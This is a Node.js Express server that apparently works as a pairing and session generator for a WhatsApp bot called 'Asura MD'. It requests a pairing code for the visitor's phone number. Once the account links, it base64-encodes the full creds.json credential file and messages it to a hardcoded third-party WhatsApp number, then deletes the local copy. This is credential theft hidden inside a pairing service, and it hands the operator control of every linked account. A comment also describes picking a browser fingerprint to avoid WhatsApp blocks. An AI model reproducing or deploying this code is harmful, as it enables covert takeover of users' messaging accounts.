import express from 'express';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    Browsers, 
    makeCacheableSignalKeyStore, 
    DisconnectReason 
} from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pair', async (req, res) => {
    let phone = req.query.number; 
    if (!phone) return res.send({ error: "Phone number is required" });

    const id = Math.random().toString(36).substring(2, 10);
    const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);

    try {
        const sock = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            // വാട്സാപ്പ് ബ്ലോക്ക് ചെയ്യാത്ത ഒറിജിനൽ ബ്രൗസർ സെറ്റിംഗ്സ് 👇
            browser: Browsers.macOS("Desktop"),
            syncFullHistory: false
        });

        if (!sock.authState.creds.registered) {
            await delay(2500); 
            phone = phone.replace(/[^0-9]/g, '');
            
            const code = await sock.requestPairingCode(phone);
            
            if (!res.headersSent) {
                res.send({ code: code });
            }
        }

        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                // "Loading" പ്രശ്നം ഒഴിവാക്കാൻ കൂടുതൽ ഡിലേ നൽകുന്നു
                await delay(12000); 
                
                const credsPath = `./temp_${id}/creds.json`;
                if (fs.existsSync(credsPath)) {
                    const authFile = JSON.parse(fs.readFileSync(credsPath));
                    const sessionId = Buffer.from(JSON.stringify(authFile)).toString('base64');

                    const myNumber = "917736811908@s.whatsapp.net";
                    const sessionID = `Asura_MD_${sessionId}`;
                    
                    // സെഷൻ ഐഡി അയക്കുന്നു
                    await sock.sendMessage(myNumber, { text: sessionID });
                    await sock.sendMessage(myNumber, { 
                        text: `*👺 ASURA MD SESSION CONNECTED*\n\n✅ *User:* ${phone}\n\n> Don't share this ID!` 
                    });

                    await delay(5000);
                    // സെഷൻ എടുത്തു കഴിഞ്ഞാൽ ക്ലീൻ അപ്പ്
                    try {
                        sock.end();
                        fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
                    } catch (e) {}
                }
            }

            if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                if (reason !== DisconnectReason.loggedOut) {
                    try { fs.rmSync(`./temp_${id}`, { recursive: true, force: true }); } catch (e) {}
                }
            }
        });

    } catch (err) {
        console.log("Error:", err);
        if (!res.headersSent) {
            res.status(500).send({ error: "Try again after some time." });
        }
    }
});

app.listen(port, () => console.log(`Asura MD Ultimate Engine on port ${port}`));
